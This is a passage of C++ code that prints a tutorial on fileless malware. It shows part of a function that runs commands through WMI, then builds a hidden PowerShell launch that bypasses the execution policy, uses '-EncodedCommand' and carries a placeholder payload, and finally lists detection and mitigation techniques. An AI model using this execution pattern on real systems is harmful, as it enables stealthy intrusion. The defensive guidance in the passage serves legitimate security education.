    std::cout << "    // Check the return value\n";
    std::cout << "    VARIANT vtReturnValue;\n";
    std::cout << "    pOutParams->Get(_bstr_t(L\"ReturnValue\"), 0, &vtReturnValue, NULL, NULL);\n";
    std::cout << "    bool success = (vtReturnValue.intVal == 0);\n\n";
    
    std::cout << "    // Clean up\n";
    std::cout << "    VariantClear(&vtCommand);\n";
    std::cout << "    VariantClear(&vtReturnValue);\n";
    std::cout << "    if (pOutParams) pOutParams->Release();\n";
    std::cout << "    if (pParams) pParams->Release();\n";
    std::cout << "    if (pInParams) pInParams->Release();\n";
    std::cout << "    if (pClass) pClass->Release();\n";
    std::cout << "    if (pServices) pServices->Release();\n";
    std::cout << "    if (pLocator) pLocator->Release();\n";
    std::cout << "    CoUninitialize();\n\n";
    
    std::cout << "    return success;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Main function to demonstrate WMI-based fileless execution\n";
    std::cout << "int main() {\n";
    std::cout << "    // Use WMI to execute PowerShell with encoded command\n";
    std::cout << "    const char* encoded_command = \"base64_encoded_powershell_command\";\n";
    std::cout << "    std::string command = \"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand \";\n";
    std::cout << "    command += encoded_command;\n\n";
    
    std::cout << "    if (ExecuteCommandViaWMI(command.c_str())) {\n";
    std::cout << "        std::cout << \"Successfully executed command via WMI.\\n\";\n";
    std::cout << "    } else {\n";
    std::cout << "        std::cout << \"Failed to execute command via WMI.\\n\";\n";
    std::cout << "    }\n\n";
    
    std::cout << "    return 0;\n";
    std::cout << "}\n";
    std::cout << "```\n\n";
    
    // Detection and mitigation
    std::cout << "Detection techniques for fileless malware:\n";
    std::cout << "1. Memory scanning:\n";
    std::cout << "   - Look for suspicious code patterns in process memory\n";
    std::cout << "   - Detect shellcode characteristics and execution patterns\n\n";
    
    std::cout << "2. Behavioral monitoring:\n";
    std::cout << "   - Monitor for suspicious process creation chains\n";
    std::cout << "   - Track unusual PowerShell or WMI activity\n";
    std::cout << "   - Monitor for memory-only execution patterns\n\n";
    
    std::cout << "3. Script block logging:\n";
    std::cout << "   - Enable PowerShell script block logging\n";
    std::cout << "   - Analyze executed scripts for malicious content\n\n";
    
    std::cout << "4. Network monitoring:\n";
    std::cout << "   - Look for suspicious data transfers\n";
    std::cout << "   - Monitor for unusual connections to remote servers\n\n";
    
    std::cout << "5. Registry monitoring:\n";
    std::cout << "   - Watch for unusual binary data in registry keys\n";
    std::cout << "   - Monitor for registry modifications that could enable persistence\n\n";
    
    std::cout << "Mitigation techniques for fileless malware:\n";
    std::cout << "1. Application whitelisting\n";
    std::cout << "2. Script execution policies (e.g., PowerShell Constrained Language Mode)\n";
    std::cout << "3. Memory protection mechanisms\n";
    std::cout << "4. Behavior-based detection systems\n";
    std::cout << "5. Network segmentation and monitoring\n";
    std::cout << "6. Regular security updates and patching\n";
    std::cout << "7. User education on social engineering techniques\n";
}

